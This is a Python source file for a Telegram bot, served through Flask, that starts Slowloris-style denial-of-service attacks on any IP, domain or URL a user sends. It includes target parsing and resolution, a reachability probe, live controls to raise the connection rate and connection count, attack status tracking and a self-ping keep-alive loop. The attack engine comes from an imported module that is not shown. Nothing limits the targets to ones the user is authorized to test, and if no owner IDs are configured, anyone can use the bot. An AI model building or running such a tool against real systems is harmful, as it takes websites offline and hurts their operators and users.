import asyncio
import logging
import os
import re
import socket
import threading
import time
from urllib.parse import urlparse

import requests
from flask import Flask, jsonify, request

from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import (
    Application,
    CallbackQueryHandler,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
)

from attacker import SlowlorisAttack
from db import active_jobs, add_job, delete_stopped, heartbeat, mark_stopped, reset_stale

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

BOT_TOKEN = os.getenv("BOT_TOKEN", "")
OWNER_IDS = [int(x) for x in os.getenv("OWNER_IDS", "").split(",") if x.strip()]
DEFAULT_PORT = int(os.getenv("DEFAULT_PORT", "80"))
MAX_CONN = int(os.getenv("MAX_CONN", os.getenv("DEFAULT_CONN", "400")))
RATE_PER_SEC = int(os.getenv("RATE_PER_SEC", "80"))
TRICKLE_INTERVAL = float(os.getenv("TRICKLE_INTERVAL", "1"))
ATTACK_MODE = os.getenv("ATTACK_MODE", "mixed")      # slow | flood | mixed
SSL_VERIFY = os.getenv("SSL_VERIFY", "0") == "1"
PORT = int(os.getenv("PORT", "10000"))
SELF_URL = (os.getenv("RENDER_EXTERNAL_URL") or os.getenv("SELF_URL") or "").rstrip("/")
PING_INTERVAL = int(os.getenv("PING_INTERVAL", "600"))

IP_RE = re.compile(r"^(\d{1,3}\.){3}\d{1,3}$")
IPPORT_RE = re.compile(r"^(\d{1,3}\.){3}\d{1,3}:\d{1,5}$")
DOMAIN_RE = re.compile(r"^[a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)+$")

attacks = {}   # chat_id -> SlowlorisAttack

BOT_LOOP = asyncio.new_event_loop()
threading.Thread(target=lambda: (asyncio.set_event_loop(BOT_LOOP),
                                 BOT_LOOP.run_forever()),
                 daemon=True).start()


def allowed(update: Update) -> bool:
    if not OWNER_IDS:
        return True
    return update.effective_user.id in OWNER_IDS


def valid_ip(ip: str) -> bool:
    if not IP_RE.match(ip):
        return False
    return all(0 <= int(p) <= 255 for p in ip.split("."))


def resolve(host: str):
    """Resolve a hostname to an IPv4 (fall back to IPv6)."""
    try:
        infos = socket.getaddrinfo(host, None, socket.AF_INET, socket.SOCK_STREAM)
    except socket.gaierror:
        return None
    if infos:
        return infos[0][4][0]
    try:
        infos6 = socket.getaddrinfo(host, None, socket.AF_INET6, socket.SOCK_STREAM)
        return infos6[0][4][0] if infos6 else None
    except socket.gaierror:
        return None


def parse_target(text: str):
    """Accept: IP, IP:port, URL (http/https with path), bare domain, domain:port.

    Returns a dict {host, connect_ip, port, path, ssl, display} or
    (None, error_message)."""
    text = text.strip()
    if not text:
        return None, "empty"

    lower = text.lower()

    # ---- full URL: http://host[:port]/path  or  https://... ----
    if lower.startswith(("http://", "https://")):
        u = urlparse(text)
        host = u.hostname
        if not host:
            return None, "bad_url"
        ssl = u.scheme == "https"
        port = u.port or (443 if ssl else 80)
        path = u.path or "/"
        if u.query:
            path += "?" + u.query
        connect_ip = resolve(host)
        if not connect_ip:
            return None, "dns_failed"
        display = f"{u.scheme}://{host}:{port}{path}"
        return {"host": host, "connect_ip": connect_ip, "port": port,
                "path": path, "ssl": ssl, "display": display}

    # ---- bare IP or IP:port ----
    if IPPORT_RE.match(text):
        ip, port_str = text.rsplit(":", 1)
        port = int(port_str)
        return {"host": ip, "connect_ip": ip, "port": port, "path": "/",
                "ssl": port == 443, "display": ip + ":" + port_str}
    if valid_ip(text):
        return {"host": text, "connect_ip": text, "port": DEFAULT_PORT, "path": "/",
                "ssl": DEFAULT_PORT == 443, "display": text}

    # ---- bare domain or domain:port ----
    domain, sep, port_str = text.rpartition(":")
    if sep and port_str.isdigit():
        d = domain.lower()
        if DOMAIN_RE.match(d):
            ip = resolve(d)
            if not ip:
                return None, "dns_failed"
            port = int(port_str)
            return {"host": d, "connect_ip": ip, "port": port, "path": "/",
                    "ssl": port == 443, "display": f"{d}:{port}"}
    else:
        d = lower
        if DOMAIN_RE.match(d):
            ip = resolve(d)
            if not ip:
                return None, "dns_failed"
            return {"host": d, "connect_ip": ip, "port": DEFAULT_PORT,
                    "path": "/", "ssl": DEFAULT_PORT == 443, "display": d}

    return None, "invalid"


def probe(target_info: dict, timeout: float = 5.0):
    """TCP connectivity test against a parsed target."""
    t0 = time.time()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        s.connect((target_info["connect_ip"], target_info["port"]))
        return {"reachable": True, "rtt_ms": round((time.time() - t0) * 1000, 1)}
    except socket.timeout:
        return {"reachable": False, "reason": "timeout (SYN dropped / filtered)"}
    except OSError as e:
        name = socket.errorcode.get(getattr(e, "errno", 0), type(e).__name__)
        return {"reachable": False, "reason": name}
    finally:
        s.close()


def start_attack(chat_id: int, info: dict):
    attack = SlowlorisAttack(
        target=info["connect_ip"],
        port=info["port"],
        max_conn=MAX_CONN,
        rate=RATE_PER_SEC,
        trickle_interval=TRICKLE_INTERVAL,
        mode=ATTACK_MODE,
        path=info["path"],
        host_header=info["host"],
        ssl_enabled=info["ssl"],
        verify_ssl=SSL_VERIFY,
        on_heartbeat=lambda st: heartbeat(chat_id, st),
    )
    attacks[chat_id] = attack
    add_job(chat_id, info, MAX_CONN)
    attack.start()
    return attack


# ---------------- Telegram handlers ----------------

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not allowed(update):
        return await update.message.reply_text("⛔ Not authorized.")
    await update.message.reply_text(
        "🤖 *Slow Bot*\n\n"
        "Send a target and I'll saturate it with HTTP requests:\n\n"
        "• `203.0.113.10` — IP, port 80\n"
        "• `203.0.113.10:8080` — IP with port\n"
        "• `example.com` — bare domain\n"
        "• `https://example.com/login.php` — link, exact page\n\n"
        "Commands:\n"
        "`/ping <target>` — connectivity test\n"
        "`/rate 200` — conns/sec\n"
        "`/conn 800` — max connections\n"
        "`/status` · `/stop` · `/clean`",
        parse_mode="Markdown",
    )


async def handle_target(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not allowed(update):
        return await update.message.reply_text("⛔ Not authorized.")

    chat_id = update.effective_chat.id
    info, err = parse_target(update.message.text)
    if not info:
        msgs = {
            "bad_url": "❌ Couldn't read that URL. Use `https://example.com/page`.",
            "dns_failed": "❌ DNS lookup failed — the domain doesn't resolve.",
            "invalid": "❌ Invalid target. Try an IP, domain, or link.",
        }
        return await update.message.reply_text(msgs.get(err, "❌ Invalid target."))

    if chat_id in attacks and attacks[chat_id].is_running:
        return await update.message.reply_text("⚠️ Attack already running. Use `/stop` first.")

    attack = start_attack(chat_id, info)
    scheme = "https" if info["ssl"] else "http"

    kb = InlineKeyboardMarkup([[InlineKeyboardButton("⛔ Stop Attack", callback_data="stop")]])
    await update.message.reply_text(
        f"🚀 Attack started on `{info['display']}`\n"
        f"• Resolved IP: `{info['connect_ip']}`\n"
        f"• Path: `{info['path']}`\n"
        f"• Rate: `{RATE_PER_SEC}` conns/sec · Max: `{MAX_CONN}` · Mode: `{ATTACK_MODE}`\n\n"
        f"Watch it with `/status`. Press the button or `/stop` to end.",
        parse_mode="Markdown", reply_markup=kb)
    logger.info("Attack started on %s -> %s (%s) chat %s",
                info["display"], info["connect_ip"], scheme, chat_id)


async def stop_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not allowed(update):
        return await update.message.reply_text("⛔ Not authorized.")
    chat_id = update.effective_chat.id
    attack = attacks.get(chat_id)
    if not attack or not attack.is_running:
        return await update.message.reply_text("ℹ️ No running attack.")
    attack.stop()
    mark_stopped(chat_id)
    attacks.pop(chat_id, None)
    await update.message.reply_text("🛑 Attack stopped. All sockets closed.")


async def stop_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    chat_id = update.effective_chat.id
    attack = attacks.get(chat_id)
    if attack and attack.is_running:
        attack.stop()
        mark_stopped(chat_id)
        attacks.pop(chat_id, None)
        await query.edit_message_text("🛑 Attack stopped. All sockets closed.")
    else:
        await query.edit_message_text("ℹ️ No running attack.")


async def ping_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not allowed(update):
        return await update.message.reply_text("⛔ Not authorized.")
    if not context.args:
        return await update.message.reply_text("Usage: `/ping <ip|domain|link>`")
    info, err = parse_target(" ".join(context.args))
    if not info:
        return await update.message.reply_text(
            "❌ " + ("DNS lookup failed." if err == "dns_failed" else "Invalid target."))

    msg = await update.message.reply_text(
        f"🔍 Probing `{info['display']}` (IP `{info['connect_ip']}`) ...")
    result = probe(info)
    if result["reachable"]:
        await msg.edit_text(
            f"✅ `{info['display']}` → `{info['connect_ip']}` is **reachable** "
            f"(RTT ~{result['rtt_ms']} ms).\nStart the attack.")
    else:
        await msg.edit_text(
            f"❌ `{info['display']}` → `{info['connect_ip']}` **not reachable** — "
            f"`{result['reason']}`.\n\nThe bot can't establish TCP, so no request "
            f"volume will ever build up. Check firewall/port first.")
    logger.info("/ping %s -> %s", info["display"], result)


async def rate_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not allowed(update):
        return await update.message.reply_text("⛔ Not authorized.")
    chat_id = update.effective_chat.id
    attack = attacks.get(chat_id)
    if not attack or not attack.is_running:
        return await update.message.reply_text("ℹ️ No running attack.")
    try:
        n = int(context.args[0])
    except (IndexError, ValueError):
        return await update.message.reply_text("Usage: `/rate <1-2000>`")
    attack.set_rate(max(1, min(n, 2000)))
    await update.message.reply_text(f"⚡ Rate set to `{attack.rate}` conns/sec.")


async def conn_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not allowed(update):
        return await update.message.reply_text("⛔ Not authorized.")
    chat_id = update.effective_chat.id
    attack = attacks.get(chat_id)
    if not attack or not attack.is_running:
        return await update.message.reply_text("ℹ️ No running attack.")
    try:
        n = int(context.args[0])
    except (IndexError, ValueError):
        return await update.message.reply_text("Usage: `/conn <10-5000>`")
    attack.set_max_conn(max(10, min(n, 5000)))
    await update.message.reply_text(f"🔗 Max connections set to `{attack.max_conn}`.")


async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not allowed(update):
        return await update.message.reply_text("⛔ Not authorized.")
    jobs = active_jobs()
    if not jobs and not attacks:
        return await update.message.reply_text("ℹ️ Nothing running.")

    lines = ["📊 *Attack status:*"]
    for cid, a in list(attacks.items()):
        if not a.is_running:
            continue
        st = a.stats()
        err = " ".join(f"{k}={v}" for k, v in list(st["errors"].items())[:3])
        scheme = "https" if st["ssl"] else "http"
        lines.append(
            f"• `{scheme}://{st['host_header']}:{st['port']}{st['path']}` **LIVE**\n"
            f"  conns: `{st['connections']}` (max {st['max_conn']})\n"
            f"  opened: `{st['opened']}` failed: `{st['failed']}`\n"
            f"  rate: `{st['rate']}/s` mode: `{st['mode']}`\n"
            f"  errors: `{err or 'none'}`")
    for j in jobs:
        cid = j.get("chat_id")
        if cid not in attacks or not attacks[cid].is_running:
            p = j.get("path", "/")
            lines.append(
                f"• `{j['target']}:{j['port']}{p}` ⚠️ *orphaned* "
                f"(bot restarted — use `/clean`)")
    await update.message.reply_text("\n".join(lines), parse_mode="Markdown")


async def clean_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not allowed(update):
        return await update.message.reply_text("⛔ Not authorized.")
    n = delete_stopped()
    await update.message.reply_text(f"🧹 Removed {n} stopped job(s).")


# ---------------- bot setup ----------------

def build_bot() -> Application:
    bot = Application.builder().token(BOT_TOKEN).build()
    bot.add_handler(CommandHandler("start", start))
    bot.add_handler(CommandHandler("stop", stop_cmd))
    bot.add_handler(CommandHandler("status", status_cmd))
    bot.add_handler(CommandHandler("clean", clean_cmd))
    bot.add_handler(CommandHandler("ping", ping_cmd))
    bot.add_handler(CommandHandler("rate", rate_cmd))
    bot.add_handler(CommandHandler("conn", conn_cmd))
    bot.add_handler(CallbackQueryHandler(stop_callback, pattern="^stop$"))
    bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_target))
    return bot


application = build_bot()

app = Flask(__name__)


@app.get("/")
def index():
    return jsonify({"service": "slowbot", "status": "ok"})


@app.get("/health")
def health():
    live = [a for a in attacks.values() if a.is_running]
    conns = sum(a.stats()["connections"] for a in live) if live else 0
    return jsonify({"ok": True, "active_attacks": len(live), "connections": conns})


@app.post("/webhook")
def webhook():
    try:
        update = Update.de_json(request.get_json(force=True), application.bot)
        asyncio.run_coroutine_threadsafe(application.process_update(update), BOT_LOOP)
        return ("ok", 200)
    except Exception as e:
        logger.exception("Webhook error: %s", e)
        return ("error", 500)


def self_ping_loop():
    url = f"{SELF_URL}/health"
    logger.info("Self-ping thread → %s every %ss", url, PING_INTERVAL)
    while True:
        time.sleep(PING_INTERVAL)
        try:
            r = requests.get(url, timeout=15)
            logger.info("Self-ping → %s (%s)", r.status_code, r.text[:40])
        except Exception as e:
            logger.warning("Self-ping failed: %s", e)


async def _init_bot():
    await application.initialize()
    if SELF_URL:
        await application.bot.set_webhook(url=f"{SELF_URL}/webhook")
        info = await application.bot.get_webhook_info()
        logger.info("Webhook registered: %s", info.url)
    else:
        logger.error("RENDER_EXTERNAL_URL not set — cannot register webhook")


def init_bot():
    fut = asyncio.run_coroutine_threadsafe(_init_bot(), BOT_LOOP)
    fut.result(timeout=30)


def main():
    if not BOT_TOKEN:
        raise SystemExit("BOT_TOKEN env var is required")
    if not SELF_URL:
        logger.error("Set RENDER_EXTERNAL_URL (auto on Render web services)")
        raise SystemExit(1)
    reset_stale()
    init_bot()
    threading.Thread(target=self_ping_loop, daemon=True).start()
    logger.info("Serving on port %s (mode=%s, rate=%s/s, max_conn=%s)",
                PORT, ATTACK_MODE, RATE_PER_SEC, MAX_CONN)
    app.run(host="0.0.0.0", port=PORT, threaded=True)


if __name__ == "__main__":
    main()
